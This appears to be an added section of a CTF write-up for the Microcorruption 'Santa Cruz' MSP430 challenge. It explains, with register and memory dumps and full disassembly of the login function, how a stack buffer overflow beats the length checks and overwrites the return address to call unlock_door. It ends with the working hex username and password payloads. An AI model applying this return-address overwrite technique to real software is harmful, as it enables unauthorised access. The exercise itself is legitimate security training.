@@ -243,3 +243,149 @@ Unlike the last couple of challenges this program is checking if the user input 
 ### Solved
 
 password = 4141414141414141414141414141414141524644
+
+## Santa Cruz
+
+This challenge we have both a username and password this time. If start the program it states that both should be less than 16 characters. So, to start off if we enter should enter 20 "A"s as the username and password. The first problem is the cmp op code on 4600 in the login function. Once the code reaches there it exits, while printing "Invalid Password Length: password too short.". If we set a breakpoint there we can see that r11 and r15 are being compared with each other. r11 has hex 14 in it and r15 has hex 41. We can see that whatever was suppose to be in r15 was overwritten with an A and r11 is 20 decimal or the size of the inputs we entered. If we check the next line jumps to the exit code, if r15 is greater than r11. So, since we know that we can overwrite the value what if we enter a smaller number there. If we see on line 45fa, r15 is 19 hex minus r4, which is 43cc, which equals 43b3. If we look at the memory dump that location is where our inputs are stored and it is 17 characters from the start. So we need 17 characters than a small number in the username.
+
+```asm
+pc  4600  sp  43a0  sr  0005  cg  0000
+r04 43cc  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0014
+r12 0000  r13 43c9  r14 43c9  r15 0041
+
+4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
+43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
+43b0:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+43c0:   4141 4141 4141 4141 4141 0000 4044 0000   AAAAAAAAAA..@D..
+```
+
+This time we enter 41414141414141414141414141414141410141 as the username and 20 "A"s again as the password. This time when we at the compare at line 4600 we pass it and continue on with the code. The problem this time is line, 4650. At this line the code jumps to an exit if this is not a 0 at the memory location 6 hex minus r4, or 43cc, which equals 43c6. At that memory location is an A or hex 41 not a 0. What we can do is shorten the password so there is a 0 there.
+
+```asm
+pc  45ea  sp  43a0  sr  0001  cg  0000
+r04 43cc  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0014
+r12 0000  r13 43c9  r14 43c9  r15 0001
+
+4390:   0000 d846 0300 4c47 0000 0a00 1400 4c46   ...F..LG......LF
+43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
+43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
+43c0:   4141 4141 4141 4141 4100 0000 4044 0000   AAAAAAAAA...@D..
+```
+
+So this time we enter 41414141414141414141414141414141410141 as the username and 16 "A"s again as the password. We pass the compares and reach the return code this time. We can now see that the return address is stored at 43cc, which is somewhere we can overwrite it. The problem is we need a 0 at the memory location 43c6. If we think about how the function strcpy works it adds a null byte at the end of the string it is copying. So if we make the username long enough to overwrite the return address to the unlock_door address, 444a. We can have the password small enough to, so when it gets copied it replaces whatever is at 43c6 with a 0. Creating this username and password solves the challenge.
+
+```asm
+pc  4666  sp  43cc  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0000
+r12 0000  r13 43c4  r14 0000  r15 0000
+
+4390:   0000 d846 0300 4c47 0000 0a00 0f00 4c46   ...F..LG......LF
+43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
+43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
+43c0:   4141 4141 0000 0000 0000 0000 4044 0000   AAAA........@D..
+```
+
+```asm
+444a <unlock_door>
+444a:  3012 7f00      push	#0x7f
+444e:  b012 c446      call	#0x46c4 <INT>
+4452:  2153           incd	sp
+4454:  3041           ret
+
+
+4550 <login>
+4550:  0b12           push	r11
+4552:  0412           push	r4
+4554:  0441           mov	sp, r4
+4556:  2452           add	#0x4, r4
+4558:  3150 d8ff      add	#0xffd8, sp
+455c:  c443 faff      mov.b	#0x0, -0x6(r4)
+4560:  f442 e7ff      mov.b	#0x8, -0x19(r4)
+4564:  f440 1000 e8ff mov.b	#0x10, -0x18(r4)
+456a:  3f40 8444      mov	#0x4484 "Authentication now requires a username and password.", r15
+456e:  b012 2847      call	#0x4728 <puts>
+4572:  3f40 b944      mov	#0x44b9 "Remember: both are between 8 and 16 characters.", r15
+4576:  b012 2847      call	#0x4728 <puts>
+457a:  3f40 e944      mov	#0x44e9 "Please enter your username:", r15
+457e:  b012 2847      call	#0x4728 <puts>
+4582:  3e40 6300      mov	#0x63, r14
+4586:  3f40 0424      mov	#0x2404, r15
+458a:  b012 1847      call	#0x4718 <getsn>
+458e:  3f40 0424      mov	#0x2404, r15
+4592:  b012 2847      call	#0x4728 <puts>
+4596:  3e40 0424      mov	#0x2404, r14
+459a:  0f44           mov	r4, r15
+459c:  3f50 d6ff      add	#0xffd6, r15
+45a0:  b012 5447      call	#0x4754 <strcpy>
+45a4:  3f40 0545      mov	#0x4505 "Please enter your password:", r15
+45a8:  b012 2847      call	#0x4728 <puts>
+45ac:  3e40 6300      mov	#0x63, r14
+45b0:  3f40 0424      mov	#0x2404, r15
+45b4:  b012 1847      call	#0x4718 <getsn>
+45b8:  3f40 0424      mov	#0x2404, r15
+45bc:  b012 2847      call	#0x4728 <puts>
+45c0:  0b44           mov	r4, r11
+45c2:  3b50 e9ff      add	#0xffe9, r11
+45c6:  3e40 0424      mov	#0x2404, r14
+45ca:  0f4b           mov	r11, r15
+45cc:  b012 5447      call	#0x4754 <strcpy>
+45d0:  0f4b           mov	r11, r15
+45d2:  0e44           mov	r4, r14
+45d4:  3e50 e8ff      add	#0xffe8, r14
+45d8:  1e53           inc	r14
+45da:  ce93 0000      tst.b	0x0(r14)
+45de:  fc23           jnz	#0x45d8 <login+0x88>
+45e0:  0b4e           mov	r14, r11
+45e2:  0b8f           sub	r15, r11
+45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
+45e8:  8f11           sxt	r15
+45ea:  0b9f           cmp	r15, r11
+45ec:  0628           jnc	#0x45fa <login+0xaa>
+45ee:  1f42 0024      mov	&0x2400, r15
+45f2:  b012 2847      call	#0x4728 <puts>
+45f6:  3040 4044      br	#0x4440 <__stop_progExec__>
+45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
+45fe:  8f11           sxt	r15
+4600:  0b9f           cmp	r15, r11
+4602:  062c           jc	#0x4610 <login+0xc0>
+4604:  1f42 0224      mov	&0x2402, r15
+4608:  b012 2847      call	#0x4728 <puts>
+460c:  3040 4044      br	#0x4440 <__stop_progExec__>
+4610:  c443 d4ff      mov.b	#0x0, -0x2c(r4)
+4614:  3f40 d4ff      mov	#0xffd4, r15
+4618:  0f54           add	r4, r15
+461a:  0f12           push	r15
+461c:  0f44           mov	r4, r15
+461e:  3f50 e9ff      add	#0xffe9, r15
+4622:  0f12           push	r15
+4624:  3f50 edff      add	#0xffed, r15
+4628:  0f12           push	r15
+462a:  3012 7d00      push	#0x7d
+462e:  b012 c446      call	#0x46c4 <INT>
+4632:  3152           add	#0x8, sp
+4634:  c493 d4ff      tst.b	-0x2c(r4)
+4638:  0524           jz	#0x4644 <login+0xf4>
+463a:  b012 4a44      call	#0x444a <unlock_door>
+463e:  3f40 2145      mov	#0x4521 "Access granted.", r15
+4642:  023c           jmp	#0x4648 <login+0xf8>
+4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
+4648:  b012 2847      call	#0x4728 <puts>
+464c:  c493 faff      tst.b	-0x6(r4)
+4650:  0624           jz	#0x465e <login+0x10e>
+4652:  1f42 0024      mov	&0x2400, r15
+4656:  b012 2847      call	#0x4728 <puts>
+465a:  3040 4044      br	#0x4440 <__stop_progExec__>
+465e:  3150 2800      add	#0x28, sp
+4662:  3441           pop	r4
+4664:  3b41           pop	r11
+4666:  3041           ret
+```
+
+### Solved
+
+username = 4141414141414141414141414141414141014141414141414141414141414141414141414141414141414a44
+password = 4141414141414141414141414141414141
+
